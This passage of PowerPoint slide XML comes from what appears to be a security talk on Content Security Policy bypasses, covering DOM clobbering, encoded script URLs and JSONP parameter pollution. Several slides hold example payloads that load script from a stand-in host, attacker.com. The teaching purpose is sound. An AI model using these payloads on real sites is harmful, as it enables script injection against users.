              <a:gd name="adj" fmla="val 1738"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="791051" y="3413284"/>
            <a:ext cx="3395186" cy="1268016"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;script nonce="random123"&gt;</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var config = window.config || {apiUrl: 'https://api.example.com'};</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loadScript(config.apiUrl + '/script.js');</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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622102" y="4971217"/>
            <a:ext cx="2666524" cy="333375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622102" y="5461278"/>
            <a:ext cx="3733086" cy="1280874"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2082"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="613291" y="5461278"/>
            <a:ext cx="3750707" cy="1280874"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2082"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="791051" y="5594509"/>
            <a:ext cx="3395186" cy="1014413"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;form name="config"&gt;</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  &lt;input name="apiUrl" value="https://attacker.com"&gt;</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&lt;/form&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796433" y="2789992"/>
            <a:ext cx="2666524" cy="333375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796433" y="3280053"/>
            <a:ext cx="3733086" cy="1534477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1738"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4787622" y="3280053"/>
            <a:ext cx="3750707" cy="1534477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1738"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4965383" y="3413284"/>
            <a:ext cx="3395186" cy="1268016"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 window.config is now the form element</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 config.apiUrl is the input value</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="195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loadScript('https://attacker.com/script.js');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796433" y="4971217"/>
            <a:ext cx="2666524" cy="333375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4796433" y="5443895"/>
            <a:ext cx="3733086" cy="761053"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Named HTML elements create global variables</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Clobbers expected configuration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Loads script from attacker domain</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32642" y="799981"/>
            <a:ext cx="7961709" cy="559951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Method 3: Unicode/Encoding Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1132642" y="1643063"/>
            <a:ext cx="12365117" cy="1322665"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2032"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311831" y="1822252"/>
            <a:ext cx="2240042" cy="279916"/>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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311831" y="2261354"/>
            <a:ext cx="12006739" cy="525185"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5118"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1302901" y="2261354"/>
            <a:ext cx="12024598" cy="525185"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5118"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1482090" y="2395657"/>
            <a:ext cx="11666220" cy="256580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Content-Security-Policy: script-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1132642" y="3178016"/>
            <a:ext cx="2688074" cy="335994"/>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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1132642" y="3726299"/>
            <a:ext cx="12365117" cy="2321243"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1158"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123712" y="3726299"/>
            <a:ext cx="12382976" cy="2321243"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1158"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1302901" y="3860602"/>
            <a:ext cx="12024598" cy="2052638"/>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 Unicode escaping --&gt;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&lt;script src="\\u0068\\u0074\\u0074\\u0070\\u0073://attacker.com/evil.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 URL encoding --&gt;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&lt;script src="%68%74%74%70%73://attacker.com/evil.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Mixed encoding --&gt;</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&lt;script src="htt\\u0070s://attacker.com/evil.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1132642" y="6259830"/>
            <a:ext cx="2688074" cy="335994"/>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Why it might work:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1132642" y="6808113"/>
            <a:ext cx="403146" cy="403146"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6668"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1677353" y="6869668"/>
            <a:ext cx="3459004" cy="559832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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CSP parser may not normalize encodings</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5313283" y="6808113"/>
            <a:ext cx="403146" cy="403146"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6668"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5857994" y="6869668"/>
            <a:ext cx="3459004" cy="559832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Browser normalizes before loading</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9493925" y="6808113"/>
            <a:ext cx="403146" cy="403146"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6668"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10038636" y="6869668"/>
            <a:ext cx="2828687" cy="279916"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Bypasses string matching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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5915" y="906304"/>
            <a:ext cx="7832169" cy="1171575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Method 4: HTTP Parameter Pollution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="655915" y="2464951"/>
            <a:ext cx="2830116" cy="351353"/>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Vulnerable Endpoint:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="655915" y="2990493"/>
            <a:ext cx="3687485" cy="828437"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3394"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="646628" y="2990493"/>
            <a:ext cx="3706058" cy="828437"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3394"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="834033" y="3130987"/>
            <a:ext cx="3331250" cy="547449"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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https://victim.com/api/data?callback=processData</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="655915" y="3885144"/>
            <a:ext cx="2811423" cy="351353"/>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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="655915" y="4410686"/>
            <a:ext cx="3687485" cy="1375886"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2043"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="646628" y="4410686"/>
            <a:ext cx="3706058" cy="1375886"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2043"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="834033" y="4551180"/>
            <a:ext cx="3331250" cy="1094899"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;script src="https://victim.com/api/data?callback=alert&amp;callback=processData"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="655915" y="5960761"/>
            <a:ext cx="2811423" cy="351353"/>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Server Response:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="655915" y="6486303"/>
            <a:ext cx="3687485" cy="554712"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5068"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
